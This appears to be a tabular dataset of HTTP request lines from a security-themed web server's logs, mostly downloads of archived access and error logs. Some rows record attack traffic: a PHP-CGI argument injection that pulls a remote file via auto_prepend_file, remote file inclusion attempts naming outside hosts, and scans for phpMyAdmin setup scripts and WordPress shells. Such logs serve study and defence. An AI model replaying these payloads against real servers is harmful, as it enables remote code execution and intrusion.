47,1,200,0,GET /self.logs/error.log.2016-07-27.gz HTTP/1.1,355
47,1,200,0,GET /self.logs/error.log.2016-02-01.gz HTTP/1.1,356
48,1,200,0,GET /self.logs/access.log.2015-02-13.gz HTTP/1.1,357
48,1,200,0,GET /self.logs/access.log.2015-04-19.gz HTTP/1.1,358
18,1,404,1,GET /sql/ HTTP/1.1,359
47,1,200,0,GET /self.logs/error.log.2015-04-15.gz HTTP/1.1,360
33,1,200,0,GET /tg/tg_snort_fast.7z HTTP/1.1,361
48,1,200,0,GET /self.logs/access.log.2016-05-28.gz HTTP/1.1,362
32,1,200,0,GET /self.logs/?C=N;O=A HTTP/1.0,363
47,1,200,0,GET /self.logs/error.log.2015-05-14.gz HTTP/1.1,364
47,1,200,0,GET /self.logs/error.log.2016-01-11.gz HTTP/1.1,365
48,1,200,0,GET /self.logs/access.log.2015-07-03.gz HTTP/1.1,366
48,1,200,0,GET /self.logs/access.log.2016-08-08.gz HTTP/1.1,367
47,1,200,0,GET /self.logs/error.log.2016-01-06.gz HTTP/1.1,368
48,1,200,0,GET /self.logs/access.log.2016-07-07.gz HTTP/1.1,369
47,1,200,0,GET /self.logs/error.log.2015-05-11.gz HTTP/1.1,370
48,1,200,0,GET /self.logs/access.log.2015-06-21.gz HTTP/1.1,371
47,1,200,0,GET /self.logs/error.log.2016-09-09.gz HTTP/1.1,372
111,1,404,0,GET //write.php?dir=http://www.kennyagrisoft.com//wp-content/themes/DynamiX/lib/scripts/hacker.txt???? HTTP/1.1,373
32,1,200,0,GET /self.logs/?C=M;O=D HTTP/1.1,374
48,1,200,0,GET /self.logs/access.log.2016-10-09.gz HTTP/1.1,375
48,1,200,0,GET /self.logs/access.log.2016-10-04.gz HTTP/1.1,376
48,1,200,0,GET /self.logs/access.log.2016-10-19.gz HTTP/1.1,377
47,1,200,0,GET /self.logs/error.log.2016-04-14.gz HTTP/1.1,378
23,1,301,0,GET /wp-admin/ HTTP/1.1,379
48,1,200,0,GET /self.logs/access.log.2016-10-14.gz HTTP/1.1,380
47,1,200,0,GET /self.logs/error.log.2016-08-17.gz HTTP/1.1,381
47,1,200,0,GET /self.logs/error.log.2016-12-25.gz HTTP/1.1,382
47,1,200,0,GET /self.logs/error.log.2016-04-12.gz HTTP/1.1,383
48,1,200,0,GET /self.logs/access.log.2016-07-04.gz HTTP/1.1,384
47,1,200,0,GET /self.logs/error.log.2015-03-16.gz HTTP/1.1,385
47,1,200,0,GET /self.logs/error.log.2016-08-30.gz HTTP/1.1,386
47,1,200,0,GET /self.logs/error.log.2016-11-20.gz HTTP/1.1,387
47,1,200,0,GET /self.logs/error.log.2015-05-09.gz HTTP/1.1,388
41,1,404,0,GET /apple-touch-icon120x120.png HTTP/1.1,389
47,1,200,0,GET /self.logs/error.log.2016-10-25.gz HTTP/1.1,390
48,1,200,0,GET /self.logs/access.log.2015-05-24.gz HTTP/1.1,391
48,1,200,0,GET /self.logs/access.log.2015-09-12.gz HTTP/1.1,392
38,1,404,0,GET /access.log.2015-02-07.gz HTTP/1.1,393
47,1,200,0,GET /self.logs/error.log.2015-07-02.gz HTTP/1.1,394
38,1,404,0,GET /access.log.2015-01-26.gz HTTP/1.1,395
47,1,200,0,GET /self.logs/error.log.2016-10-20.gz HTTP/1.1,396
38,1,404,0,GET /access.log.2015-02-25.gz HTTP/1.1,397
48,1,404,0,GET /self.logs/access.log.2015-01-12.gz HTTP/1.1,398
38,1,404,0,GET /access.log.2015-02-05.gz HTTP/1.1,399
38,1,404,0,GET /access.log.2015-02-17.gz HTTP/1.1,400
48,1,200,0,GET /self.logs/access.log.2015-07-24.gz HTTP/1.1,401
47,1,200,0,GET /self.logs/error.log.2015-10-15.gz HTTP/1.1,402
48,1,404,0,GET /self.logs/access.log.2015-01-02.gz HTTP/1.1,403
47,1,200,0,GET /self.logs/error.log.2015-04-13.gz HTTP/1.1,404
48,1,200,0,GET /self.logs/access.log.2015-07-09.gz HTTP/1.1,405
48,1,200,0,GET /self.logs/access.log.2016-02-03.gz HTTP/1.1,406
48,1,200,0,GET /self.logs/access.log.2015-11-21.gz HTTP/1.1,407
47,1,200,0,GET /self.logs/error.log.2016-05-15.gz HTTP/1.1,408
47,1,200,0,GET /self.logs/error.log.2016-12-03.gz HTTP/1.1,409
48,1,200,0,GET /self.logs/access.log.2015-08-30.gz HTTP/1.1,410
48,1,404,0,GET /self.logs/access.log.2015-02-30.gz HTTP/1.1,411
47,1,200,0,GET /self.logs/error.log.2016-05-26.gz HTTP/1.1,412
48,1,200,0,GET /self.logs/access.log.2016-05-30.gz HTTP/1.1,413
48,1,404,0,GET /self.logs/access.log.2016-11-31.gz HTTP/1.1,414
48,1,200,0,GET /self.logs/access.log.2015-04-16.gz HTTP/1.1,415
48,1,200,0,GET /self.logs/access.log.2015-03-11.gz HTTP/1.1,416
48,1,200,0,GET /self.logs/access.log.2015-08-13.gz HTTP/1.1,417
48,1,200,0,GET /self.logs/access.log.2015-04-02.gz HTTP/1.1,418
48,1,200,0,GET /self.logs/access.log.2016-09-16.gz HTTP/1.1,419
38,1,404,0,GET /access.log.2015-01-28.gz HTTP/1.1,420
48,1,200,0,GET /self.logs/access.log.2015-01-26.gz HTTP/1.1,421
47,1,200,0,GET /self.logs/error.log.2016-08-28.gz HTTP/1.1,422
48,1,200,0,GET /self.logs/access.log.2015-12-23.gz HTTP/1.1,423
25,1,404,0,GET /maccdc2011/ HTTP/1.1,424
70,3,404,0,GET /community/index.php?app=core&module=global&section=login HTTP/1.1,425
48,1,200,0,GET /self.logs/access.log.2015-07-31.gz HTTP/1.1,426
47,1,200,0,GET /self.logs/error.log.2015-04-05.gz HTTP/1.1,427
48,1,404,0,GET /self.logs/access.log.2016-04-31.gz HTTP/1.1,428
23,1,200,0,GET /auth.log/ HTTP/1.1,429
47,1,200,0,GET /self.logs/error.log.2015-01-30.gz HTTP/1.1,430
42,1,200,0,GET /maccdc2012/signatures.log.gz HTTP/1.1,431
48,1,200,0,GET /self.logs/access.log.2015-02-25.gz HTTP/1.1,432
48,1,200,0,GET /self.logs/access.log.2015-04-08.gz HTTP/1.1,433
48,1,200,0,GET /self.logs/access.log.2015-02-05.gz HTTP/1.1,434
47,1,200,0,GET /self.logs/error.log.2015-12-31.gz HTTP/1.1,435
47,1,200,0,GET /self.logs/error.log.2015-02-01.gz HTTP/1.1,436
48,1,200,0,GET /self.logs/access.log.2016-12-24.gz HTTP/1.1,437
19,1,301,0,GET /squid HTTP/1.1,438
48,1,200,0,GET /self.logs/access.log.2015-03-29.gz HTTP/1.1,439
47,1,200,0,GET /self.logs/error.log.2015-12-11.gz HTTP/1.1,440
48,1,200,0,GET /self.logs/access.log.2015-07-04.gz HTTP/1.1,441
48,1,200,0,GET /self.logs/access.log.2015-10-15.gz HTTP/1.1,442
38,1,404,0,GET /access.log.2015-01-18.gz HTTP/1.1,443
48,1,200,0,GET /self.logs/access.log.2016-03-25.gz HTTP/1.1,444
48,1,404,0,GET /self.logs/access.log.2015-01-01.gz HTTP/1.1,445
48,1,200,0,GET /self.logs/access.log.2016-04-29.gz HTTP/1.1,446
47,1,200,0,GET /self.logs/error.log.2015-05-16.gz HTTP/1.1,447
48,1,200,0,GET /self.logs/access.log.2015-06-30.gz HTTP/1.1,448
32,1,200,0,GET /self.logs/?C=D;O=A HTTP/1.1,449
48,1,200,0,GET /self.logs/access.log.2015-04-06.gz HTTP/1.1,450
48,1,200,0,GET /self.logs/access.log.2016-01-01.gz HTTP/1.1,451
48,1,200,0,GET /self.logs/access.log.2016-06-11.gz HTTP/1.1,452
48,1,200,0,GET /self.logs/access.log.2015-01-28.gz HTTP/1.1,453
47,1,200,0,GET /self.logs/error.log.2015-11-19.gz HTTP/1.1,454
48,1,200,0,GET /self.logs/access.log.2015-03-30.gz HTTP/1.1,455
21,1,200,0,OPTIONS /tg/ HTTP/1.1,456
47,1,200,0,GET /self.logs/error.log.2016-05-22.gz HTTP/1.1,457
47,1,200,0,GET /self.logs/error.log.2015-03-12.gz HTTP/1.1,458
47,1,200,0,GET /self.logs/error.log.2016-03-29.gz HTTP/1.1,459
48,1,404,0,GET /self.logs/access.log.2015-01-16.gz HTTP/1.1,460
47,1,200,0,GET /self.logs/error.log.2015-03-06.gz HTTP/1.1,461
47,1,200,0,GET /self.logs/error.log.2015-06-18.gz HTTP/1.1,462
47,1,200,0,GET /self.logs/error.log.2015-05-18.gz HTTP/1.1,463
47,1,200,0,GET /self.logs/error.log.2015-04-17.gz HTTP/1.1,464
48,1,200,0,GET /self.logs/access.log.2015-05-12.gz HTTP/1.1,465
48,1,200,0,GET /self.logs/access.log.2016-09-08.gz HTTP/1.1,466
47,1,200,0,GET /self.logs/error.log.2015-12-27.gz HTTP/1.1,467
48,1,200,0,GET /self.logs/access.log.2015-07-18.gz HTTP/1.1,468
48,1,200,0,GET /self.logs/access.log.2015-01-18.gz HTTP/1.1,469
47,1,200,0,GET /self.logs/error.log.2015-04-11.gz HTTP/1.1,470
48,1,200,0,GET /self.logs/access.log.2015-03-14.gz HTTP/1.1,471
48,1,200,0,GET /self.logs/access.log.2015-10-22.gz HTTP/1.1,472
48,1,404,0,GET /self.logs/access.log.2015-01-10.gz HTTP/1.1,473
47,1,200,0,GET /self.logs/error.log.2015-04-19.gz HTTP/1.1,474
47,1,200,0,GET /self.logs/error.log.2016-06-10.gz HTTP/1.1,475
48,1,200,0,GET /self.logs/access.log.2016-02-20.gz HTTP/1.1,476
48,1,200,0,GET /self.logs/access.log.2015-05-04.gz HTTP/1.1,477
25,1,200,0,GET /favicon.ico HTTP/1.1,478
48,1,200,0,GET /self.logs/access.log.2016-03-16.gz HTTP/1.1,479
48,1,200,0,GET /self.logs/access.log.2016-01-19.gz HTTP/1.1,480
39,1,404,0,HEAD /editors/fckeditor/editor HTTP/1.1,481
27,1,404,0,GET /administrator HTTP/1.1,482
47,1,200,0,GET /self.logs/error.log.2015-03-30.gz HTTP/1.1,483
48,1,404,0,GET /self.logs/access.log.2015-01-07.gz HTTP/1.1,484
48,1,200,0,GET /self.logs/access.log.2016-04-27.gz HTTP/1.1,485
32,1,200,0,GET /self.logs/?C=N;O=D HTTP/1.1,486
48,1,200,0,GET /self.logs/access.log.2015-07-20.gz HTTP/1.1,487
47,1,200,0,GET /self.logs/error.log.2016-09-12.gz HTTP/1.1,488
47,1,200,0,GET /self.logs/error.log.2016-01-16.gz HTTP/1.1,489
48,1,200,0,GET /self.logs/access.log.2016-12-03.gz HTTP/1.1,490
47,1,200,0,GET /self.logs/error.log.2016-06-08.gz HTTP/1.1,491
48,1,200,0,GET /self.logs/access.log.2016-02-15.gz HTTP/1.1,492
48,1,200,0,GET /self.logs/access.log.2016-02-07.gz HTTP/1.1,493
47,1,200,0,GET /self.logs/error.log.2015-05-03.gz HTTP/1.1,494
48,1,200,0,GET /self.logs/access.log.2016-09-29.gz HTTP/1.1,495
48,1,200,0,GET /self.logs/access.log.2015-10-24.gz HTTP/1.1,496
48,1,200,0,GET /self.logs/access.log.2016-03-02.gz HTTP/1.1,497
48,1,404,0,GET /bootstrap/img/apple-touch-icon.png HTTP/1.1,498
33,1,404,0,HEAD /js/mage/cookies.js HTTP/1.1,499
40,1,404,0,GET /apple-touch-icon-76x76.png HTTP/1.1,500
47,1,200,0,GET /self.logs/error.log.2016-12-05.gz HTTP/1.1,501
44,1,404,0,GET //wp-content/plugins/ubh/up.php HTTP/1.0,502
48,1,200,0,GET /self.logs/access.log.2016-01-24.gz HTTP/1.1,503
48,1,200,0,GET /self.logs/access.log.2016-12-28.gz HTTP/1.1,504
47,1,200,0,GET /self.logs/error.log.2016-05-10.gz HTTP/1.1,505
48,1,200,0,GET /self.logs/access.log.2016-05-12.gz HTTP/1.1,506
48,1,200,0,GET /self.logs/access.log.2015-06-07.gz HTTP/1.1,507
48,1,200,0,GET /self.logs/access.log.2016-12-12.gz HTTP/1.1,508
48,1,200,0,GET /self.logs/access.log.2015-12-11.gz HTTP/1.1,509
48,1,200,0,GET /self.logs/access.log.2016-06-23.gz HTTP/1.1,510
25,1,418,0,GET //xmlrpc.php HTTP/1.1,511
48,1,200,0,GET /self.logs/access.log.2016-06-16.gz HTTP/1.1,512
47,1,200,0,GET /self.logs/error.log.2016-03-01.gz HTTP/1.1,513
112,1,200,0,GET /?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp://www.transwareag.com/media/jce/tio.txt HTTP/1.1,514
48,1,200,0,GET /self.logs/access.log.2015-01-31.gz HTTP/1.1,515
48,1,200,0,GET /self.logs/access.log.2015-11-04.gz HTTP/1.1,516
32,1,200,0,GET /self.logs/?C=S;O=A HTTP/1.1,517
47,1,200,0,GET /self.logs/error.log.2016-06-03.gz HTTP/1.1,518
48,1,200,0,GET /self.logs/access.log.2015-06-16.gz HTTP/1.1,519
48,1,200,0,GET /self.logs/access.log.2015-11-10.gz HTTP/1.1,520
48,1,200,0,GET /self.logs/access.log.2015-06-23.gz HTTP/1.1,521
47,1,200,0,GET /self.logs/error.log.2016-02-02.gz HTTP/1.1,522
47,1,200,0,GET /self.logs/error.log.2016-09-18.gz HTTP/1.1,523
32,1,404,1,GET /honeypot/BSidesDFW HTTP/1.1,524
48,1,200,0,GET /self.logs/access.log.2016-06-30.gz HTTP/1.1,525
47,1,200,0,GET /self.logs/error.log.2015-08-04.gz HTTP/1.1,526
47,1,200,0,GET /self.logs/error.log.2016-11-03.gz HTTP/1.1,527
47,1,200,0,GET /self.logs/error.log.2016-10-08.gz HTTP/1.1,528
47,1,200,0,GET /self.logs/error.log.2015-12-03.gz HTTP/1.1,529
47,1,200,0,GET /self.logs/error.log.2015-02-18.gz HTTP/1.1,530
47,1,301,0,GET /self.logs/error.log.2015-10-05.gz HTTP/1.1,531
47,1,200,0,GET /self.logs/error.log.2015-07-20.gz HTTP/1.1,532
48,1,200,0,GET /self.logs/access.log.2015-07-17.gz HTTP/1.1,533
47,1,200,0,GET /self.logs/error.log.2016-07-18.gz HTTP/1.1,534
48,1,200,0,GET /self.logs/access.log.2015-07-21.gz HTTP/1.1,535
47,1,200,0,GET /self.logs/error.log.2015-08-06.gz HTTP/1.1,536
48,1,200,0,GET /self.logs/access.log.2016-01-22.gz HTTP/1.1,537
41,1,200,0,GET /googleb1a7c9cf768c32be.html HTTP/1.1,538
48,1,200,0,GET /self.logs/access.log.2016-04-23.gz HTTP/1.1,539
47,1,200,0,GET /self.logs/error.log.2016-02-09.gz HTTP/1.1,540
48,1,200,0,GET /self.logs/access.log.2016-11-26.gz HTTP/1.1,541
48,1,200,0,GET /self.logs/access.log.2015-05-26.gz HTTP/1.1,542
48,1,200,0,GET /self.logs/access.log.2015-05-16.gz HTTP/1.1,543
48,1,200,0,GET /self.logs/access.log.2016-05-13.gz HTTP/1.1,544
48,1,200,0,GET /self.logs/access.log.2016-05-02.gz HTTP/1.1,545
35,1,200,0,GET /maccdc2012/ftp.log.gz HTTP/1.0,546
35,1,200,0,GET /maccdc2012/ftp.log.gz HTTP/1.1,547
47,1,200,0,GET /self.logs/error.log.2015-03-23.gz HTTP/1.1,548
47,1,200,0,GET /self.logs/error.log.2016-05-14.gz HTTP/1.1,549
22,1,404,0,GET /wp-admin HTTP/1.1,550
47,1,200,0,GET /self.logs/error.log.2015-08-29.gz HTTP/1.1,551
32,1,404,0,GET /zeus/zeus_json.zip HTTP/1.1,552
47,1,200,0,GET /self.logs/error.log.2016-05-19.gz HTTP/1.1,553
48,1,200,0,GET /self.logs/access.log.2015-11-13.gz HTTP/1.1,554
37,1,404,1,GET /mysql/scripts/setup.php HTTP/1.1,555
47,1,200,0,GET /self.logs/error.log.2015-07-09.gz HTTP/1.1,556
61,1,404,1,POST /honeypot/BSidesDFW%20-%202014.ipynb/trackback/ HTTP/1.1,557
53,1,404,0,GET //wp-includes/registration-functions.php HTTP/1.0,558
47,1,200,0,GET /self.logs/error.log.2016-05-23.gz HTTP/1.1,559
47,1,200,0,GET /self.logs/error.log.2016-01-04.gz HTTP/1.1,560
48,1,404,0,GET /self.logs/access.log.2015-01-08.gz HTTP/1.1,561
47,1,200,0,GET /self.logs/error.log.2015-02-24.gz HTTP/1.1,562
48,1,200,0,GET /self.logs/access.log.2016-10-02.gz HTTP/1.1,563
47,1,200,0,GET /self.logs/error.log.2015-07-16.gz HTTP/1.1,564
48,1,200,0,GET /self.logs/access.log.2016-01-21.gz HTTP/1.1,565
48,1,200,0,GET /self.logs/access.log.2016-11-10.gz HTTP/1.1,566
48,1,200,0,GET /self.logs/access.log.2015-09-20.gz HTTP/1.1,567
47,1,200,0,GET /self.logs/error.log.2015-12-23.gz HTTP/1.1,568
47,1,200,0,GET /self.logs/error.log.2015-10-24.gz HTTP/1.1,569
38,1,404,0,GET /access.log.2015-02-14.gz HTTP/1.1,570
47,1,200,0,GET /self.logs/error.log.2015-11-12.gz HTTP/1.1,571
42,1,404,0,GET /apple-touch-icon-152x152.png HTTP/1.1,572
47,1,200,0,GET /self.logs/error.log.2016-09-21.gz HTTP/1.1,573
48,1,200,0,GET /self.logs/access.log.2015-11-06.gz HTTP/1.1,574
47,1,200,0,GET /self.logs/error.log.2016-03-10.gz HTTP/1.1,575
47,1,200,0,GET /self.logs/error.log.2015-08-07.gz HTTP/1.1,576
20,1,404,1,GET /mysql/ HTTP/1.1,577
23,1,200,1,GET /honeypot/ HTTP/1.1,578
47,1,200,0,GET /self.logs/error.log.2016-08-19.gz HTTP/1.1,579
48,1,200,0,GET /self.logs/access.log.2015-11-22.gz HTTP/1.1,580
48,1,200,0,GET /self.logs/access.log.2016-07-11.gz HTTP/1.1,581
47,1,200,0,GET /self.logs/error.log.2016-05-18.gz HTTP/1.1,582
47,1,200,0,GET /self.logs/error.log.2015-10-01.gz HTTP/1.1,583
54,1,404,0,GET /apple-touch-icon-152x152-precomposed.png HTTP/1.1,584
47,1,200,0,GET /self.logs/error.log.2016-08-23.gz HTTP/1.1,585
20,1,404,0,GET /admin/ HTTP/1.1,586
47,1,200,0,GET /self.logs/error.log.2015-12-16.gz HTTP/1.1,587
48,1,200,0,GET /self.logs/access.log.2015-02-14.gz HTTP/1.1,588
195,4,404,1,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf&amp;sa=U&amp;ved=0ahUKEwjfjZHj8IrRAhXjlFQKHfUVA2QQFgiXAjA3&amp;usg=AFQjCNECd9WKWE5QQr2RPFKoA-ce5IW95w//write.php?dir=remote?? HTTP/1.1,589
48,1,200,0,GET /self.logs/access.log.2016-02-25.gz HTTP/1.1,590
48,1,200,0,GET /self.logs/access.log.2016-07-15.gz HTTP/1.1,591
47,1,200,0,GET /self.logs/error.log.2016-02-19.gz HTTP/1.1,592
48,1,200,0,GET /self.logs/access.log.2016-12-22.gz HTTP/1.1,593
48,1,200,0,GET /self.logs/access.log.2016-05-25.gz HTTP/1.1,594
48,1,200,0,GET /self.logs/access.log.2016-10-18.gz HTTP/1.1,595
48,1,200,0,GET /self.logs/access.log.2016-08-05.gz HTTP/1.1,596
48,1,200,0,GET /self.logs/access.log.2016-09-07.gz HTTP/1.1,597
47,1,200,0,GET /self.logs/error.log.2015-10-08.gz HTTP/1.1,598
48,1,200,0,GET /self.logs/access.log.2016-10-03.gz HTTP/1.1,599
48,1,200,0,GET /self.logs/access.log.2015-09-24.gz HTTP/1.1,600
47,1,200,0,GET /self.logs/error.log.2015-05-21.gz HTTP/1.1,601
48,1,200,0,GET /self.logs/access.log.2016-09-06.gz HTTP/1.1,602
47,1,200,0,GET /self.logs/error.log.2016-04-07.gz HTTP/1.1,603
48,1,200,0,GET /self.logs/access.log.2015-02-24.gz HTTP/1.1,604
47,1,200,0,GET /self.logs/error.log.2015-12-18.gz HTTP/1.1,605
47,1,200,0,GET /self.logs/error.log.2016-12-19.gz HTTP/1.1,606
48,1,200,0,GET /self.logs/access.log.2015-06-05.gz HTTP/1.1,607
47,1,200,0,GET /self.logs/error.log.2015-03-11.gz HTTP/1.1,608
48,1,200,0,GET /self.logs/access.log.2015-09-17.gz HTTP/1.1,609
48,1,200,0,GET /self.logs/access.log.2015-08-15.gz HTTP/1.1,610
48,1,404,0,GET /self.logs/access.log.2015-02-31.gz HTTP/1.1,611
47,1,200,0,GET /self.logs/error.log.2015-02-20.gz HTTP/1.1,612
50,1,404,0,GET /phpmyadmin/scripts/db_setup.init.php HTTP/1.1,613
46,1,404,1,GET /honeypot/mysql/scripts/setup.php HTTP/1.1,614
47,1,200,0,GET /self.logs/error.log.2015-07-30.gz HTTP/1.1,615
48,1,200,0,GET /self.logs/access.log.2015-08-25.gz HTTP/1.1,616
48,1,200,0,GET /self.logs/access.log.2015-07-22.gz HTTP/1.1,617
19,1,404,0,GET /data# HTTP/1.1,618
47,1,200,0,GET /self.logs/error.log.2016-03-27.gz HTTP/1.1,619
47,1,200,0,GET /self.logs/error.log.2015-01-20.gz HTTP/1.1,620
47,1,200,0,GET /self.logs/error.log.2016-05-12.gz HTTP/1.1,621
48,1,200,0,GET /self.logs/access.log.2016-03-19.gz HTTP/1.1,622
47,1,200,0,GET /self.logs/error.log.2015-10-27.gz HTTP/1.1,623
38,1,404,0,GET /access.log.2015-02-28.gz HTTP/1.1,624
47,1,200,0,GET /self.logs/error.log.2015-06-17.gz HTTP/1.1,625
48,1,200,0,GET /self.logs/access.log.2016-06-08.gz HTTP/1.1,626
48,1,200,0,GET /self.logs/access.log.2015-03-12.gz HTTP/1.1,627
36,1,200,1,GET /self.logs/?C=D%3BO%3DA HTTP/1.1,628
48,1,200,0,GET /self.logs/access.log.2015-10-08.gz HTTP/1.1,629
47,1,200,0,GET /self.logs/error.log.2016-03-03.gz HTTP/1.1,630
48,1,200,0,GET /self.logs/access.log.2016-09-09.gz HTTP/1.1,631
47,1,200,0,GET /self.logs/error.log.2016-05-05.gz HTTP/1.1,632
47,1,200,0,GET /self.logs/error.log.2015-05-10.gz HTTP/1.1,633
48,1,200,0,GET /self.logs/access.log.2016-02-04.gz HTTP/1.1,634
47,1,200,0,GET /self.logs/error.log.2015-07-22.gz HTTP/1.1,635
48,1,200,0,GET /self.logs/access.log.2015-12-26.gz HTTP/1.1,636
48,1,200,0,GET /self.logs/access.log.2015-04-21.gz HTTP/1.1,637
48,1,200,0,GET /self.logs/access.log.2016-06-27.gz HTTP/1.1,638
48,1,200,0,GET /self.logs/access.log.2015-12-13.gz HTTP/1.1,639
47,1,200,0,GET /self.logs/error.log.2015-12-28.gz HTTP/1.1,640
48,1,200,0,GET /self.logs/access.log.2016-06-02.gz HTTP/1.1,641
47,1,200,0,GET /self.logs/error.log.2016-12-11.gz HTTP/1.1,642
48,1,200,0,GET /self.logs/access.log.2016-06-06.gz HTTP/1.1,643
48,1,200,0,GET /self.logs/access.log.2016-09-02.gz HTTP/1.1,644
47,1,200,0,GET /self.logs/error.log.2016-11-21.gz HTTP/1.1,645
47,1,200,0,GET /self.logs/error.log.2016-06-01.gz HTTP/1.1,646
47,1,200,0,GET /self.logs/error.log.2016-08-08.gz HTTP/1.1,647
47,1,200,0,GET /self.logs/error.log.2015-04-09.gz HTTP/1.1,648
47,1,200,0,GET /self.logs/error.log.2015-06-13.gz HTTP/1.1,649
47,1,200,0,GET /self.logs/error.log.2015-09-12.gz HTTP/1.1,650
25,1,200,0,GET /squid/zeus/ HTTP/1.1,651
47,1,200,0,GET /self.logs/error.log.2015-08-11.gz HTTP/1.1,652
47,1,200,0,GET /self.logs/error.log.2015-08-18.gz HTTP/1.1,653
47,1,200,0,GET /self.logs/error.log.2015-08-28.gz HTTP/1.1,654
47,1,200,0,GET /self.logs/error.log.2016-06-12.gz HTTP/1.1,655
48,1,200,0,GET /self.logs/access.log.2015-05-05.gz HTTP/1.1,656
70,1,404,1,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf' HTTP/1.1,657
48,1,200,0,GET /self.logs/access.log.2016-04-01.gz HTTP/1.1,658
47,1,200,0,GET /self.logs/error.log.2015-07-26.gz HTTP/1.1,659
47,1,200,0,GET /self.logs/error.log.2016-05-29.gz HTTP/1.1,660
47,1,200,0,GET /self.logs/error.log.2016-11-14.gz HTTP/1.1,661
47,1,200,0,GET /self.logs/error.log.2016-05-24.gz HTTP/1.1,662
48,1,200,0,GET /self.logs/access.log.2016-06-17.gz HTTP/1.1,663
48,1,200,0,GET /self.logs/access.log.2016-12-06.gz HTTP/1.1,664
48,1,200,0,GET /self.logs/access.log.2016-02-21.gz HTTP/1.1,665
47,1,200,0,GET /self.logs/error.log.2015-05-25.gz HTTP/1.1,666
47,1,200,0,GET /self.logs/error.log.2016-04-17.gz HTTP/1.1,667
48,1,200,0,GET /self.logs/access.log.2015-08-05.gz HTTP/1.1,668
48,1,200,0,GET /self.logs/access.log.2016-03-17.gz HTTP/1.1,669
47,1,200,0,GET /self.logs/error.log.2015-08-23.gz HTTP/1.1,670
25,1,200,0,GET /maccdc2012/ HTTP/1.1,671
38,1,404,0,GET /access.log.2015-03-02.gz HTTP/1.1,672
48,1,200,0,GET /self.logs/access.log.2016-02-28.gz HTTP/1.1,673
47,1,200,0,GET /self.logs/error.log.2015-08-01.gz HTTP/1.1,674
48,1,200,0,GET /self.logs/access.log.2016-12-02.gz HTTP/1.1,675
47,1,200,0,GET /self.logs/error.log.2015-11-28.gz HTTP/1.1,676
38,1,404,0,GET /access.log.2015-02-09.gz HTTP/1.1,677
48,1,200,0,GET /self.logs/access.log.2016-03-15.gz HTTP/1.1,678
47,1,200,0,GET /self.logs/error.log.2016-12-12.gz HTTP/1.1,679
47,1,200,0,GET /self.logs/error.log.2015-04-26.gz HTTP/1.1,680
47,1,200,0,GET /self.logs/error.log.2016-01-02.gz HTTP/1.1,681
48,1,200,0,GET /self.logs/access.log.2016-08-24.gz HTTP/1.1,682
48,1,200,0,GET /self.logs/access.log.2016-01-27.gz HTTP/1.1,683
48,1,200,0,GET /self.logs/access.log.2015-05-03.gz HTTP/1.1,684
48,1,200,0,GET /self.logs/access.log.2015-10-09.gz HTTP/1.1,685
48,1,200,0,GET /self.logs/access.log.2015-05-15.gz HTTP/1.1,686
48,1,200,0,GET /self.logs/access.log.2016-12-26.gz HTTP/1.1,687
48,1,200,0,GET /self.logs/access.log.2016-04-30.gz HTTP/1.1,688
48,1,200,0,GET /self.logs/access.log.2015-08-22.gz HTTP/1.1,689
48,1,200,0,GET /self.logs/access.log.2016-10-27.gz HTTP/1.1,690
48,1,404,0,GET /self.logs/access.log.2015-09-31.gz HTTP/1.1,691
47,1,200,0,GET /self.logs/error.log.2016-12-22.gz HTTP/1.1,692
47,1,200,0,GET /self.logs/error.log.2016-11-30.gz HTTP/1.1,693
48,1,200,0,GET /self.logs/access.log.2015-08-23.gz HTTP/1.1,694
48,1,200,0,GET /self.logs/access.log.2016-06-14.gz HTTP/1.1,695
48,1,404,0,GET /self.logs/access.log.2015-03-08.gz HTTP/1.1,696
47,1,200,0,GET /self.logs/error.log.2015-06-21.gz HTTP/1.1,697
47,1,200,0,GET /self.logs/error.log.2016-02-21.gz HTTP/1.1,698
47,1,200,0,GET /self.logs/error.log.2016-02-28.gz HTTP/1.1,699
47,1,200,0,GET /self.logs/error.log.2015-12-19.gz HTTP/1.1,700
47,1,200,0,GET /self.logs/error.log.2016-02-18.gz HTTP/1.1,701
48,1,200,0,GET /self.logs/access.log.2015-05-28.gz HTTP/1.1,702
47,1,200,0,GET /self.logs/error.log.2016-06-22.gz HTTP/1.1,703
49,1,200,1,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.0,704
49,1,200,1,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1,705
48,1,200,0,GET /self.logs/access.log.2015-11-12.gz HTTP/1.1,706
